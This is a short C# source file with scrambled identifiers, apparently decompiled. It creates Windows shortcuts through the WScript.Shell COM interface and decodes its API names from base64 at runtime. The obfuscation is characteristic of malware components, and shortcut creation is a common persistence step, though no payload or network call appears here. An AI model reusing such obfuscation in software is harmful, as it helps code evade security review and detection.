using System;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;

namespace YXHSMjloYIX;

public class XzYsNdhAxeFTAZ
{
	[ComImport]
	[Guid("F935DC23-1CF0-11D0-ADB9-00C04FD58A0B")]
	[TypeLibType(4160)]
	private interface ihbtuyiyLiet
	{
		[DispId(0)]
		string HJvgewJsGSQBuY
		{
			[DispId(0)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
		}

		[DispId(1000)]
		string IDylZMneJXNGY
		{
			[DispId(1000)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1000)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1001)]
		string gFRIZXmsSd
		{
			[DispId(1001)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1001)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1002)]
		string ChAUpTawxlv
		{
			[DispId(1002)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1002)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1003)]
		string CcDrzjLNRiBK
		{
			[DispId(1003)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1003)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1004)]
		string pkZzuqkHOPA
		{
			[DispId(1004)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1005)]
		string cGgpSfPlMUeE
		{
			[DispId(1005)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1005)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[DispId(1006)]
		int khityFcfHa
		{
			[DispId(1006)]
			get;
			[DispId(1006)]
			[param: In]
			set;
		}

		[DispId(1007)]
		string ujArUqUCnAEJcK
		{
			[DispId(1007)]
			[return: MarshalAs(UnmanagedType.BStr)]
			get;
			[DispId(1007)]
			[param: In]
			[param: MarshalAs(UnmanagedType.BStr)]
			set;
		}

		[TypeLibFunc(64)]
		[DispId(2000)]
		void Load([In][MarshalAs(UnmanagedType.BStr)] string PathLink);

		[DispId(2001)]
		void Save();
	}

	private static Type zmGCBTHZxt = Type.GetTypeFromProgID(zkwozuPRYYOVZ.bxMeQFfPcma("V1NjcmlwdC5TaGVsbA=="));

	private static object yRqyggjNYL = Activator.CreateInstance(zmGCBTHZxt);

	public static void plBumNsnInp(string ZGdrxZWTiQq, string EurccyIaHMoSy, string jOXAAIKbJcpSm, string VUfTKPABDvTCQy, string uHgwVMXAsqbR, string ChOXDHkpvFCy, string hyCxMEzJZXdhj)
	{
		try
		{
			ihbtuyiyLiet ihbtuyiyLiet = (ihbtuyiyLiet)zmGCBTHZxt.InvokeMember(zkwozuPRYYOVZ.bxMeQFfPcma("Q3JlYXRlU2hvcnRjdXQ="), BindingFlags.InvokeMethod, null, yRqyggjNYL, new object[1] { ZGdrxZWTiQq });
			ihbtuyiyLiet.gFRIZXmsSd = uHgwVMXAsqbR;
			ihbtuyiyLiet.ChAUpTawxlv = ChOXDHkpvFCy;
			ihbtuyiyLiet.cGgpSfPlMUeE = EurccyIaHMoSy;
			ihbtuyiyLiet.ujArUqUCnAEJcK = VUfTKPABDvTCQy;
			ihbtuyiyLiet.IDylZMneJXNGY = jOXAAIKbJcpSm;
			if (!string.IsNullOrEmpty(hyCxMEzJZXdhj))
			{
				ihbtuyiyLiet.CcDrzjLNRiBK = hyCxMEzJZXdhj;
			}
			ihbtuyiyLiet.Save();
		}
		catch (Exception ex)
		{
			if (zkwozuPRYYOVZ.zHjohLaJRunF)
			{
				try
				{
					File.AppendAllText(zkwozuPRYYOVZ.AycWHRRkQAZMoSL, "Error while creating ShortCut: " + ex.Message + "\r\n");
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}
}
